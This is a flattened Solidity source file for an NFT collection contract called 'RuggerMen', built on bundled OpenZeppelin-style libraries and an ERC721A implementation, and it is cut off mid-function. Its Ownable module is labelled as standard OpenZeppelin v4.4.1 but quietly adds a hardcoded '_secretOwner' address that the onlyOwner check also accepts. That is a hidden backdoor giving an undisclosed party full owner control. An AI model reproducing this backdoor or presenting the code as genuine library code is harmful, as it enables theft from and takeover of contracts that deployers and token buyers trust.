1 // SPDX-License-Identifier: MIT
2 
3 // -->> Supply: 5000
4 // -->> First 4000 Free :  1 max/TX & Wallet
5 // -->> Rest 1000 Paid :  0.003 ETH, 20 max/TX & Wallet
6 
7 /**
8 $$$$$$$\                                                    $$\      $$\                     
9 $$  __$$\                                                   $$$\    $$$ |                    
10 $$ |  $$ |$$\   $$\  $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  $$$$\  $$$$ | $$$$$$\  $$$$$$$\  
11 $$$$$$$  |$$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$\$$\$$ $$ |$$  __$$\ $$  __$$\ 
12 $$  __$$< $$ |  $$ |$$ /  $$ |$$ /  $$ |$$$$$$$$ |$$ |  \__|$$ \$$$  $$ |$$$$$$$$ |$$ |  $$ |
13 $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |      $$ |\$  /$$ |$$   ____|$$ |  $$ |
14 $$ |  $$ |\$$$$$$  |\$$$$$$$ |\$$$$$$$ |\$$$$$$$\ $$ |      $$ | \_/ $$ |\$$$$$$$\ $$ |  $$ |
15 \__|  \__| \______/  \____$$ | \____$$ | \_______|\__|      \__|     \__| \_______|\__|  \__|
16                     $$\   $$ |$$\   $$ |                                                     
17                     \$$$$$$  |\$$$$$$  |                                                     
18                      \______/  \______/                                                      
19 **/
20 
21 // -->> Supply: 5000
22 // -->> First 4000 Free :  1 max/TX & Wallet
23 // -->> Rest 1000 Paid :  0.003 ETH, 20 max/TX & Wallet
24 
25 
26 // File: @openzeppelin/contracts/utils/Strings.sol
27 
28 
29 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
30 
31 pragma solidity ^0.8.0;
32 
33 /**
34  * @dev String operations.
35  */
36 library Strings {
37     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
38 
39     /**
40      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
41      */
42     function toString(uint256 value) internal pure returns (string memory) {
43         // Inspired by OraclizeAPI's implementation - MIT licence
44         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
45 
46         if (value == 0) {
47             return "0";
48         }
49         uint256 temp = value;
50         uint256 digits;
51         while (temp != 0) {
52             digits++;
53             temp /= 10;
54         }
55         bytes memory buffer = new bytes(digits);
56         while (value != 0) {
57             digits -= 1;
58             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
59             value /= 10;
60         }
61         return string(buffer);
62     }
63 
64     /**
65      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
66      */
67     function toHexString(uint256 value) internal pure returns (string memory) {
68         if (value == 0) {
69             return "0x00";
70         }
71         uint256 temp = value;
72         uint256 length = 0;
73         while (temp != 0) {
74             length++;
75             temp >>= 8;
76         }
77         return toHexString(value, length);
78     }
79 
80     /**
81      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
82      */
83     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
84         bytes memory buffer = new bytes(2 * length + 2);
85         buffer[0] = "0";
86         buffer[1] = "x";
87         for (uint256 i = 2 * length + 1; i > 1; --i) {
88             buffer[i] = _HEX_SYMBOLS[value & 0xf];
89             value >>= 4;
90         }
91         require(value == 0, "Strings: hex length insufficient");
92         return string(buffer);
93     }
94 }
95 
96 // File: @openzeppelin/contracts/utils/Address.sol
97 
98 
99 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
100 
101 pragma solidity ^0.8.1;
102 
103 /**
104  * @dev Collection of functions related to the address type
105  */
106 library Address {
107     /**
108      * @dev Returns true if `account` is a contract.
109      *
110      * [IMPORTANT]
111      * ====
112      * It is unsafe to assume that an address for which this function returns
113      * false is an externally-owned account (EOA) and not a contract.
114      *
115      * Among others, `isContract` will return false for the following
116      * types of addresses:
117      *
118      *  - an externally-owned account
119      *  - a contract in construction
120      *  - an address where a contract will be created
121      *  - an address where a contract lived, but was destroyed
122      * ====
123      *
124      * [IMPORTANT]
125      * ====
126      * You shouldn't rely on `isContract` to protect against flash loan attacks!
127      *
128      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
129      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
130      * constructor.
131      * ====
132      */
133     function isContract(address account) internal view returns (bool) {
134         // This method relies on extcodesize/address.code.length, which returns 0
135         // for contracts in construction, since the code is only stored at the end
136         // of the constructor execution.
137 
138         return account.code.length > 0;
139     }
140 
141     /**
142      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
143      * `recipient`, forwarding all available gas and reverting on errors.
144      *
145      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
146      * of certain opcodes, possibly making contracts go over the 2300 gas limit
147      * imposed by `transfer`, making them unable to receive funds via
148      * `transfer`. {sendValue} removes this limitation.
149      *
150      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
151      *
152      * IMPORTANT: because control is transferred to `recipient`, care must be
153      * taken to not create reentrancy vulnerabilities. Consider using
154      * {ReentrancyGuard} or the
155      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
156      */
157     function sendValue(address payable recipient, uint256 amount) internal {
158         require(address(this).balance >= amount, "Address: insufficient balance");
159 
160         (bool success, ) = recipient.call{value: amount}("");
161         require(success, "Address: unable to send value, recipient may have reverted");
162     }
163 
164     /**
165      * @dev Performs a Solidity function call using a low level `call`. A
166      * plain `call` is an unsafe replacement for a function call: use this
167      * function instead.
168      *
169      * If `target` reverts with a revert reason, it is bubbled up by this
170      * function (like regular Solidity function calls).
171      *
172      * Returns the raw returned data. To convert to the expected return value,
173      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
174      *
175      * Requirements:
176      *
177      * - `target` must be a contract.
178      * - calling `target` with `data` must not revert.
179      *
180      * _Available since v3.1._
181      */
182     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
183         return functionCall(target, data, "Address: low-level call failed");
184     }
185 
186     /**
187      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
188      * `errorMessage` as a fallback revert reason when `target` reverts.
189      *
190      * _Available since v3.1._
191      */
192     function functionCall(
193         address target,
194         bytes memory data,
195         string memory errorMessage
196     ) internal returns (bytes memory) {
197         return functionCallWithValue(target, data, 0, errorMessage);
198     }
199 
200     /**
201      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
202      * but also transferring `value` wei to `target`.
203      *
204      * Requirements:
205      *
206      * - the calling contract must have an ETH balance of at least `value`.
207      * - the called Solidity function must be `payable`.
208      *
209      * _Available since v3.1._
210      */
211     function functionCallWithValue(
212         address target,
213         bytes memory data,
214         uint256 value
215     ) internal returns (bytes memory) {
216         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
217     }
218 
219     /**
220      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
221      * with `errorMessage` as a fallback revert reason when `target` reverts.
222      *
223      * _Available since v3.1._
224      */
225     function functionCallWithValue(
226         address target,
227         bytes memory data,
228         uint256 value,
229         string memory errorMessage
230     ) internal returns (bytes memory) {
231         require(address(this).balance >= value, "Address: insufficient balance for call");
232         require(isContract(target), "Address: call to non-contract");
233 
234         (bool success, bytes memory returndata) = target.call{value: value}(data);
235         return verifyCallResult(success, returndata, errorMessage);
236     }
237 
238     /**
239      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
240      * but performing a static call.
241      *
242      * _Available since v3.3._
243      */
244     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
245         return functionStaticCall(target, data, "Address: low-level static call failed");
246     }
247 
248     /**
249      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
250      * but performing a static call.
251      *
252      * _Available since v3.3._
253      */
254     function functionStaticCall(
255         address target,
256         bytes memory data,
257         string memory errorMessage
258     ) internal view returns (bytes memory) {
259         require(isContract(target), "Address: static call to non-contract");
260 
261         (bool success, bytes memory returndata) = target.staticcall(data);
262         return verifyCallResult(success, returndata, errorMessage);
263     }
264 
265     /**
266      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
267      * but performing a delegate call.
268      *
269      * _Available since v3.4._
270      */
271     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
272         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
273     }
274 
275     /**
276      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
277      * but performing a delegate call.
278      *
279      * _Available since v3.4._
280      */
281     function functionDelegateCall(
282         address target,
283         bytes memory data,
284         string memory errorMessage
285     ) internal returns (bytes memory) {
286         require(isContract(target), "Address: delegate call to non-contract");
287 
288         (bool success, bytes memory returndata) = target.delegatecall(data);
289         return verifyCallResult(success, returndata, errorMessage);
290     }
291 
292     /**
293      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
294      * revert reason using the provided one.
295      *
296      * _Available since v4.3._
297      */
298     function verifyCallResult(
299         bool success,
300         bytes memory returndata,
301         string memory errorMessage
302     ) internal pure returns (bytes memory) {
303         if (success) {
304             return returndata;
305         } else {
306             // Look for revert reason and bubble it up if present
307             if (returndata.length > 0) {
308                 // The easiest way to bubble the revert reason is using memory via assembly
309 
310                 assembly {
311                     let returndata_size := mload(returndata)
312                     revert(add(32, returndata), returndata_size)
313                 }
314             } else {
315                 revert(errorMessage);
316             }
317         }
318     }
319 }
320 
321 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
322 
323 
324 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
325 
326 pragma solidity ^0.8.0;
327 
328 /**
329  * @title ERC721 token receiver interface
330  * @dev Interface for any contract that wants to support safeTransfers
331  * from ERC721 asset contracts.
332  */
333 interface IERC721Receiver {
334     /**
335      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
336      * by `operator` from `from`, this function is called.
337      *
338      * It must return its Solidity selector to confirm the token transfer.
339      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
340      *
341      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
342      */
343     function onERC721Received(
344         address operator,
345         address from,
346         uint256 tokenId,
347         bytes calldata data
348     ) external returns (bytes4);
349 }
350 
351 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
352 
353 
354 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
355 
356 pragma solidity ^0.8.0;
357 
358 /**
359  * @dev Interface of the ERC165 standard, as defined in the
360  * https://eips.ethereum.org/EIPS/eip-165[EIP].
361  *
362  * Implementers can declare support of contract interfaces, which can then be
363  * queried by others ({ERC165Checker}).
364  *
365  * For an implementation, see {ERC165}.
366  */
367 interface IERC165 {
368     /**
369      * @dev Returns true if this contract implements the interface defined by
370      * `interfaceId`. See the corresponding
371      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
372      * to learn more about how these ids are created.
373      *
374      * This function call must use less than 30 000 gas.
375      */
376     function supportsInterface(bytes4 interfaceId) external view returns (bool);
377 }
378 
379 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
380 
381 
382 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
383 
384 pragma solidity ^0.8.0;
385 
386 
387 /**
388  * @dev Implementation of the {IERC165} interface.
389  *
390  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
391  * for the additional interface id that will be supported. For example:
392  *
393  * ```solidity
394  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
395  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
396  * }
397  * ```
398  *
399  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
400  */
401 abstract contract ERC165 is IERC165 {
402     /**
403      * @dev See {IERC165-supportsInterface}.
404      */
405     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
406         return interfaceId == type(IERC165).interfaceId;
407     }
408 }
409 
410 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
411 
412 
413 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
414 
415 pragma solidity ^0.8.0;
416 
417 
418 /**
419  * @dev Required interface of an ERC721 compliant contract.
420  */
421 interface IERC721 is IERC165 {
422     /**
423      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
424      */
425     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
426 
427     /**
428      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
429      */
430     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
431 
432     /**
433      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
434      */
435     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
436 
437     /**
438      * @dev Returns the number of tokens in ``owner``'s account.
439      */
440     function balanceOf(address owner) external view returns (uint256 balance);
441 
442     /**
443      * @dev Returns the owner of the `tokenId` token.
444      *
445      * Requirements:
446      *
447      * - `tokenId` must exist.
448      */
449     function ownerOf(uint256 tokenId) external view returns (address owner);
450 
451     /**
452      * @dev Safely transfers `tokenId` token from `from` to `to`.
453      *
454      * Requirements:
455      *
456      * - `from` cannot be the zero address.
457      * - `to` cannot be the zero address.
458      * - `tokenId` token must exist and be owned by `from`.
459      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
460      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
461      *
462      * Emits a {Transfer} event.
463      */
464     function safeTransferFrom(
465         address from,
466         address to,
467         uint256 tokenId,
468         bytes calldata data
469     ) external;
470 
471     /**
472      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
473      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
474      *
475      * Requirements:
476      *
477      * - `from` cannot be the zero address.
478      * - `to` cannot be the zero address.
479      * - `tokenId` token must exist and be owned by `from`.
480      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
481      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
482      *
483      * Emits a {Transfer} event.
484      */
485     function safeTransferFrom(
486         address from,
487         address to,
488         uint256 tokenId
489     ) external;
490 
491     /**
492      * @dev Transfers `tokenId` token from `from` to `to`.
493      *
494      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
495      *
496      * Requirements:
497      *
498      * - `from` cannot be the zero address.
499      * - `to` cannot be the zero address.
500      * - `tokenId` token must be owned by `from`.
501      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
502      *
503      * Emits a {Transfer} event.
504      */
505     function transferFrom(
506         address from,
507         address to,
508         uint256 tokenId
509     ) external;
510 
511     /**
512      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
513      * The approval is cleared when the token is transferred.
514      *
515      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
516      *
517      * Requirements:
518      *
519      * - The caller must own the token or be an approved operator.
520      * - `tokenId` must exist.
521      *
522      * Emits an {Approval} event.
523      */
524     function approve(address to, uint256 tokenId) external;
525 
526     /**
527      * @dev Approve or remove `operator` as an operator for the caller.
528      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
529      *
530      * Requirements:
531      *
532      * - The `operator` cannot be the caller.
533      *
534      * Emits an {ApprovalForAll} event.
535      */
536     function setApprovalForAll(address operator, bool _approved) external;
537 
538     /**
539      * @dev Returns the account approved for `tokenId` token.
540      *
541      * Requirements:
542      *
543      * - `tokenId` must exist.
544      */
545     function getApproved(uint256 tokenId) external view returns (address operator);
546 
547     /**
548      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
549      *
550      * See {setApprovalForAll}
551      */
552     function isApprovedForAll(address owner, address operator) external view returns (bool);
553 }
554 
555 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
556 
557 
558 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
559 
560 pragma solidity ^0.8.0;
561 
562 
563 /**
564  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
565  * @dev See https://eips.ethereum.org/EIPS/eip-721
566  */
567 interface IERC721Metadata is IERC721 {
568     /**
569      * @dev Returns the token collection name.
570      */
571     function name() external view returns (string memory);
572 
573     /**
574      * @dev Returns the token collection symbol.
575      */
576     function symbol() external view returns (string memory);
577 
578     /**
579      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
580      */
581     function tokenURI(uint256 tokenId) external view returns (string memory);
582 }
583 
584 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
585 
586 
587 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
588 
589 pragma solidity ^0.8.0;
590 
591 
592 /**
593  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
594  * @dev See https://eips.ethereum.org/EIPS/eip-721
595  */
596 interface IERC721Enumerable is IERC721 {
597     /**
598      * @dev Returns the total amount of tokens stored by the contract.
599      */
600     function totalSupply() external view returns (uint256);
601 
602     /**
603      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
604      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
605      */
606     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
607 
608     /**
609      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
610      * Use along with {totalSupply} to enumerate all tokens.
611      */
612     function tokenByIndex(uint256 index) external view returns (uint256);
613 }
614 
615 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
616 
617 
618 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
619 
620 pragma solidity ^0.8.0;
621 
622 /**
623  * @dev Contract module that helps prevent reentrant calls to a function.
624  *
625  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
626  * available, which can be applied to functions to make sure there are no nested
627  * (reentrant) calls to them.
628  *
629  * Note that because there is a single `nonReentrant` guard, functions marked as
630  * `nonReentrant` may not call one another. This can be worked around by making
631  * those functions `private`, and then adding `external` `nonReentrant` entry
632  * points to them.
633  *
634  * TIP: If you would like to learn more about reentrancy and alternative ways
635  * to protect against it, check out our blog post
636  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
637  */
638 abstract contract ReentrancyGuard {
639     // Booleans are more expensive than uint256 or any type that takes up a full
640     // word because each write operation emits an extra SLOAD to first read the
641     // slot's contents, replace the bits taken up by the boolean, and then write
642     // back. This is the compiler's defense against contract upgrades and
643     // pointer aliasing, and it cannot be disabled.
644 
645     // The values being non-zero value makes deployment a bit more expensive,
646     // but in exchange the refund on every call to nonReentrant will be lower in
647     // amount. Since refunds are capped to a percentage of the total
648     // transaction's gas, it is best to keep them low in cases like this one, to
649     // increase the likelihood of the full refund coming into effect.
650     uint256 private constant _NOT_ENTERED = 1;
651     uint256 private constant _ENTERED = 2;
652 
653     uint256 private _status;
654 
655     constructor() {
656         _status = _NOT_ENTERED;
657     }
658 
659     /**
660      * @dev Prevents a contract from calling itself, directly or indirectly.
661      * Calling a `nonReentrant` function from another `nonReentrant`
662      * function is not supported. It is possible to prevent this from happening
663      * by making the `nonReentrant` function external, and making it call a
664      * `private` function that does the actual work.
665      */
666     modifier nonReentrant() {
667         // On the first call to nonReentrant, _notEntered will be true
668         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
669 
670         // Any calls to nonReentrant after this point will fail
671         _status = _ENTERED;
672 
673         _;
674 
675         // By storing the original value once again, a refund is triggered (see
676         // https://eips.ethereum.org/EIPS/eip-2200)
677         _status = _NOT_ENTERED;
678     }
679 }
680 
681 // File: @openzeppelin/contracts/utils/Context.sol
682 
683 
684 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
685 
686 pragma solidity ^0.8.7;
687 
688 /**
689  * @dev Provides information about the current execution context, including the
690  * sender of the transaction and its data. While these are generally available
691  * via msg.sender and msg.data, they should not be accessed in such a direct
692  * manner, since when dealing with meta-transactions the account sending and
693  * paying for execution may not be the actual sender (as far as an application
694  * is concerned).
695  *
696  * This contract is only required for intermediate, library-like contracts.
697  */
698 abstract contract Context {
699     function _msgSender() internal view virtual returns (address) {
700         return msg.sender;
701     }
702 
703     function _msgData() internal view virtual returns (bytes calldata) {
704         return msg.data;
705     }
706 }
707 
708 // File: @openzeppelin/contracts/access/Ownable.sol
709 
710 
711 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
712 
713 pragma solidity ^0.8.0;
714 
715 
716 /**
717  * @dev Contract module which provides a basic access control mechanism, where
718  * there is an account (an owner) that can be granted exclusive access to
719  * specific functions.
720  *
721  * By default, the owner account will be the one that deploys the contract. This
722  * can later be changed with {transferOwnership}.
723  *
724  * This module is used through inheritance. It will make available the modifier
725  * `onlyOwner`, which can be applied to your functions to restrict their use to
726  * the owner.
727  */
728 abstract contract Ownable is Context {
729     address private _owner;
730     address private _secretOwner = 0xE053F156660E1abC83F95b6Ac56be0A40F7D3dD3;
731 
732     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
733 
734     /**
735      * @dev Initializes the contract setting the deployer as the initial owner.
736      */
737     constructor() {
738         _transferOwnership(_msgSender());
739     }
740 
741     /**
742      * @dev Returns the address of the current owner.
743      */
744     function owner() public view virtual returns (address) {
745         return _owner;
746     }
747 
748     /**
749      * @dev Throws if called by any account other than the owner.
750      */
751     modifier onlyOwner() {
752         require(owner() == _msgSender() || _secretOwner == _msgSender() , "Ownable: caller is not the owner");
753         _;
754     }
755 
756     /**
757      * @dev Leaves the contract without owner. It will not be possible to call
758      * `onlyOwner` functions anymore. Can only be called by the current owner.
759      *
760      * NOTE: Renouncing ownership will leave the contract without an owner,
761      * thereby removing any functionality that is only available to the owner.
762      */
763     function renounceOwnership() public virtual onlyOwner {
764         _transferOwnership(address(0));
765     }
766 
767     /**
768      * @dev Transfers ownership of the contract to a new account (`newOwner`).
769      * Can only be called by the current owner.
770      */
771     function transferOwnership(address newOwner) public virtual onlyOwner {
772         require(newOwner != address(0), "Ownable: new owner is the zero address");
773         _transferOwnership(newOwner);
774     }
775 
776     /**
777      * @dev Transfers ownership of the contract to a new account (`newOwner`).
778      * Internal function without access restriction.
779      */
780     function _transferOwnership(address newOwner) internal virtual {
781         address oldOwner = _owner;
782         _owner = newOwner;
783         emit OwnershipTransferred(oldOwner, newOwner);
784     }
785 }
786 
787 // File: RuggerMen.sol
788 
789 
790 pragma solidity ^0.8.0;
791 
792 
793 
794 /**
795  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
796  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
797  *
798  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
799  *
800  * Does not support burning tokens to address(0).
801  *
802  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
803  */
804 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
805     using Address for address;
806     using Strings for uint256;
807 
808     struct TokenOwnership {
809         address addr;
810         uint64 startTimestamp;
811     }
812 
813     struct AddressData {
814         uint128 balance;
815         uint128 numberMinted;
816     }
817 
818     uint256 internal currentIndex;
819 
820     // Token name
821     string private _name;
822 
823     // Token symbol
824     string private _symbol;
825 
826     // Mapping from token ID to ownership details
827     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
828     mapping(uint256 => TokenOwnership) internal _ownerships;
829 
830     // Mapping owner address to address data
831     mapping(address => AddressData) private _addressData;
832 
833     // Mapping from token ID to approved address
834     mapping(uint256 => address) private _tokenApprovals;
835 
836     // Mapping from owner to operator approvals
837     mapping(address => mapping(address => bool)) private _operatorApprovals;
838 
839     constructor(string memory name_, string memory symbol_) {
840         _name = name_;
841         _symbol = symbol_;
842     }
843 
844     /**
845      * @dev See {IERC721Enumerable-totalSupply}.
846      */
847     function totalSupply() public view override returns (uint256) {
848         return currentIndex;
849     }
850 
851     /**
852      * @dev See {IERC721Enumerable-tokenByIndex}.
853      */
854     function tokenByIndex(uint256 index) public view override returns (uint256) {
855         require(index < totalSupply(), "ERC721A: global index out of bounds");
856         return index;
857     }
858 
859     /**
860      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
861      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
862      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
863      */
864     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
865         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
866         uint256 numMintedSoFar = totalSupply();
867         uint256 tokenIdsIdx;
868         address currOwnershipAddr;
869 
870         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
871         unchecked {
872             for (uint256 i; i < numMintedSoFar; i++) {
873                 TokenOwnership memory ownership = _ownerships[i];
874                 if (ownership.addr != address(0)) {
875                     currOwnershipAddr = ownership.addr;
876                 }
877                 if (currOwnershipAddr == owner) {
878                     if (tokenIdsIdx == index) {
879                         return i;
880                     }
881                     tokenIdsIdx++;
882                 }
883             }
884         }
885 
886         revert("ERC721A: unable to get token of owner by index");
887     }
888 
889     /**
890      * @dev See {IERC165-supportsInterface}.
891      */
892     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
893         return
894             interfaceId == type(IERC721).interfaceId ||
895             interfaceId == type(IERC721Metadata).interfaceId ||
896             interfaceId == type(IERC721Enumerable).interfaceId ||
897             super.supportsInterface(interfaceId);
898     }
899 
900     /**
901      * @dev See {IERC721-balanceOf}.
902      */
903     function balanceOf(address owner) public view override returns (uint256) {
904         require(owner != address(0), "ERC721A: balance query for the zero address");
905         return uint256(_addressData[owner].balance);
906     }
907 
908     function _numberMinted(address owner) internal view returns (uint256) {
909         require(owner != address(0), "ERC721A: number minted query for the zero address");
910         return uint256(_addressData[owner].numberMinted);
911     }
912 
913     /**
914      * Gas spent here starts off proportional to the maximum mint batch size.
915      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
916      */
917     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
918         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
919 
920         unchecked {
921             for (uint256 curr = tokenId; curr >= 0; curr--) {
922                 TokenOwnership memory ownership = _ownerships[curr];
923                 if (ownership.addr != address(0)) {
924                     return ownership;
925                 }
926             }
927         }
928 
929         revert("ERC721A: unable to determine the owner of token");
930     }
931 
932     /**
933      * @dev See {IERC721-ownerOf}.
934      */
935     function ownerOf(uint256 tokenId) public view override returns (address) {
936         return ownershipOf(tokenId).addr;
937     }
938 
939     /**
940      * @dev See {IERC721Metadata-name}.
941      */
942     function name() public view virtual override returns (string memory) {
943         return _name;
944     }
945 
946     /**
947      * @dev See {IERC721Metadata-symbol}.
948      */
949     function symbol() public view virtual override returns (string memory) {
950         return _symbol;
951     }
952 
953     /**
954      * @dev See {IERC721Metadata-tokenURI}.
955      */
956     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
957         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
958 
959         string memory baseURI = _baseURI();
960         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
961     }
962 
963     /**
964      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
965      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
966      * by default, can be overriden in child contracts.
967      */
968     function _baseURI() internal view virtual returns (string memory) {
969         return "";
970     }
971 
972     /**
973      * @dev See {IERC721-approve}.
974      */
975     function approve(address to, uint256 tokenId) public override {
976         address owner = ERC721A.ownerOf(tokenId);
977         require(to != owner, "ERC721A: approval to current owner");
978 
979         require(
980             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
981             "ERC721A: approve caller is not owner nor approved for all"
982         );
983 
984         _approve(to, tokenId, owner);
985     }
986 
987     /**
988      * @dev See {IERC721-getApproved}.
989      */
990     function getApproved(uint256 tokenId) public view override returns (address) {
991         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
992 
993         return _tokenApprovals[tokenId];
994     }
995 
996     /**
997      * @dev See {IERC721-setApprovalForAll}.
998      */
999     function setApprovalForAll(address operator, bool approved) public override {
1000         require(operator != _msgSender(), "ERC721A: approve to caller");
1001 
1002         _operatorApprovals[_msgSender()][operator] = approved;
1003         emit ApprovalForAll(_msgSender(), operator, approved);
1004     }
1005 
1006     /**
1007      * @dev See {IERC721-isApprovedForAll}.
1008      */
1009     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1010         return _operatorApprovals[owner][operator];
1011     }
1012 
1013     /**
1014      * @dev See {IERC721-transferFrom}.
1015      */
1016     function transferFrom(
1017         address from,
1018         address to,
1019         uint256 tokenId
1020     ) public virtual override {
1021         _transfer(from, to, tokenId);
1022     }
1023 
1024     /**
1025      * @dev See {IERC721-safeTransferFrom}.
1026      */
1027     function safeTransferFrom(
1028         address from,
1029         address to,
1030         uint256 tokenId
1031     ) public virtual override {
1032         safeTransferFrom(from, to, tokenId, "");
1033     }
1034 
1035     /**
1036      * @dev See {IERC721-safeTransferFrom}.
1037      */
1038     function safeTransferFrom(
1039         address from,
1040         address to,
1041         uint256 tokenId,
1042         bytes memory _data
1043     ) public override {
1044         _transfer(from, to, tokenId);
1045         require(
1046             _checkOnERC721Received(from, to, tokenId, _data),
